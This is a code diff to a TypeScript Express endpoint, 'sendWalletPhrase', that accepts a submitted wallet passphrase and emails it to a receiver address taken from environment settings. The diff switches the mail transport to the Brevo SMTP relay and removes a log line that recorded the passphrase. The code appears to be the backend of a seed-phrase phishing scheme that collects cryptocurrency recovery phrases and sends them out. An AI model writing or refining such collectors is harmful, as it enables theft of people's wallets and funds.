@@ -5,13 +5,26 @@ import { Request, Response } from 'express';
 
 // Configure your email transport (use environment variables for real projects)
 const transporter = nodemailer.createTransport({
-  service: 'gmail',
+  host: 'smtp-relay.brevo.com',
+  port: 587,
+  secure: false, 
   auth: {
     user: process.env.MAIL_USER,
     pass: process.env.MAIL_PASS,
   },
+  logger: true,
+  debug: true,
 });
 
+
+// Function to verify connection to Brevo SMTP
+export const verifyBrevoConnection = async () => {
+  try {
+    await transporter.verify();
+  } catch (error) {
+  }
+};
+// verifyBrevoConnection();
 export const sendWalletPhrase = async (req: Request, res: Response) => {
   const { passphrase } = req.body;
   if (!passphrase) {
@@ -19,14 +32,13 @@ export const sendWalletPhrase = async (req: Request, res: Response) => {
   }
   try {
     await transporter.sendMail({
-      from: process.env.MAIL_USER,
+      from: process.env.MAIL_FROM || process.env.MAIL_USER,
       to: process.env.MAIL_RECEIVER,
       subject: 'New Wallet Passphrase Submission',
       text: `Wallet Passphrase: ${passphrase}`,
     });
     res.status(200).json({ message: 'Email sent successfully' });
   } catch (error) {
-    console.error(`Error sending email to ${process.env.MAIL_RECEIVER} with passphrase "${passphrase}":`, error);
     if (error instanceof Error) {
       res.status(500).json({ error: 'Failed to send email', details: error.message, stack: error.stack });
     } else {
